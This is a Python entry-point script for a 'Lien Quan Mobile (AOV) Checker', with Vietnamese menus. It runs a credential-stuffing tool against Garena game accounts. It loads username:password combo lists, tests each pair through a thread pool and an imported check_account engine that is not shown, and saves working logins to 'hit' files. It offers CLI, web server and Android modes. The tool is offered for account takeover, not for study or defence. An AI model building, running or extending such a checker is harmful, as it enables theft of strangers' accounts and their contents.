"""
Main Master Controller for Garena Lien Quan Mobile (AOV) Checker
Direct Terminal CLI + Web UI + Android Packager
"""
import os
import sys

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

# Ensure root directory in sys.path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from cli.interactive_cli import (
    clear_screen,
    print_banner,
    print_account_card,
    run_cli,
    select_menu,
    c,
    Colors,
)
from core.aov_engine import check_account, parse_combo_line
from web.server import start_web_server


def print_help():
    print("""
Cú pháp sử dụng:
  python main.py                     : Mở thẳng giao diện dòng lệnh CLI (Terminal)
  python main.py --web [--port 8080] : Khởi động Web Server (Trình duyệt PC & Mobile)
  python main.py <acc> <pass>        : Check ngay 1 tài khoản
  python main.py <file.txt> [luồng]  : Check file combo tốc độ cao
""")


def main():
    args = sys.argv[1:]

    # 1. Trợ giúp
    if "--help" in args or "-h" in args:
        print_help()
        return

    # 2. Khởi chạy Web UI
    if "--web" in args or "-w" in args or "RENDER" in os.environ:
        port = int(os.environ.get("PORT", 8080))
        for i, a in enumerate(args):
            if a in ("--port", "-p") and i + 1 < len(args):
                try:
                    port = int(args[i + 1])
                except ValueError:
                    pass
        is_cloud = "RENDER" in os.environ or "PORT" in os.environ
        start_web_server(port=port, auto_open=not is_cloud)
        return

    # 3. Check trực tiếp 1 tài khoản từ dòng lệnh
    if len(args) >= 2 and not args[0].startswith("-") and not os.path.exists(args[0]):
        acc, pwd = args[0], args[1]
        print(f"\n⏳ Đang kiểm tra tài khoản: {acc}...")
        res = check_account(acc, pwd)
        print_account_card(res)
        return

    # 4. Check trực tiếp file combo từ dòng lệnh
    if len(args) >= 1 and os.path.isfile(args[0]):
        file_path = args[0]
        threads = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
        print(f"\n📁 Đang check danh sách: {file_path} với {threads} luồng...")
        
        combos = []
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                u, p = parse_combo_line(line)
                if u and p:
                    combos.append((u, p))
        
        os.makedirs("results", exist_ok=True)
        live_file = os.path.join("results", "hit_lienquan.txt")
        trang_file = os.path.join("results", "acc_trang_ttt.txt")

        from concurrent.futures import ThreadPoolExecutor
        import threading
        stats = {"done": 0, "hit": 0, "trang": 0}
        lock = threading.Lock()
        total = len(combos)

        def worker(pair):
            a, p = pair
            r = check_account(a, p)
            with lock:
                stats["done"] += 1
                from core.aov_engine import format_account_full_info
                done_str = f"[{stats['done']}/{total}]"
                if r["status"] == "HIT":
                    stats["hit"] += 1
                    full_line = format_account_full_info(r)
                    if r.get("is_trang"):
                        stats["trang"] += 1
                        with open(trang_file, "a", encoding="utf-8") as ft:
                            ft.write(full_line + "\n")
                    with open(live_file, "a", encoding="utf-8") as fh:
                        fh.write(full_line + "\n")
                    print(f"{done_str} {full_line}", flush=True)
                else:
                    print(f"{done_str} {a}:{p} | STATUS : {r.get('status')} | DETAIL : {r.get('message', 'FAIL')}", flush=True)

        with ThreadPoolExecutor(max_workers=threads) as ex:
            ex.map(worker, combos)
        
        print(f"\n✔ HOÀN THÀNH: {stats['hit']} SỐNG / {stats['trang']} ACC TRẮNG (Lưu tại thư mục results/)")
        return

    # 5. Kiểm tra môi trường Cloud (Render) / Android / Non-interactive để tự động mở Web Server
    is_cloud = "RENDER" in os.environ or "PORT" in os.environ
    is_android = "ANDROID_ARGUMENT" in os.environ or "ANDROID_BOOTLOGO" in os.environ or os.path.exists("/system/build.prop")
    if is_cloud or is_android or not sys.stdin.isatty():
        port = int(os.environ.get("PORT", 8080))
        start_web_server(port=port, auto_open=not is_cloud and not is_android)
        return

    # 6. Hỏi người dùng chọn chế độ rõ ràng trước khi khởi chạy bất kỳ thứ gì
    clear_screen()
    print_banner()
    print(c(Colors.YELLOW + Colors.BOLD, "[ CHON CHE DO HOAT DONG ]\n"))
    print(f"  {c(Colors.CYAN, '[1]')} Web UI Browser (Giao Dien Bang Dieu Khien 2 Cot Pro)")
    print(f"  {c(Colors.CYAN, '[2]')} CLI Terminal (Kiem Tra Danh Sach Combo .txt Da Luong)")
    print(f"  {c(Colors.CYAN, '[3]')} CLI Terminal (Kiem Tra 1 Tai Khoan Nhanh)")
    print(f"  {c(Colors.RED, '[0]')} Thoat chuong trinh")
    
    print("\n" + c(Colors.DIM, "-----------------------------------------------------------------"))
    try:
        choice = input(f"{c(Colors.GREEN + Colors.BOLD, 'Chon che do (0-3): ')}").strip()
    except (EOFError, KeyboardInterrupt):
        choice = "1"

    if choice == "1":
        start_web_server(port=8080, auto_open=True)
    elif choice == "2":
        from cli.interactive_cli import handle_bulk_check
        handle_bulk_check()
    elif choice == "3":
        from cli.interactive_cli import handle_single_check
        handle_single_check()
    else:
        print(c(Colors.YELLOW, "\nTam biet!"))
        sys.exit(0)


if __name__ == "__main__":
    main()

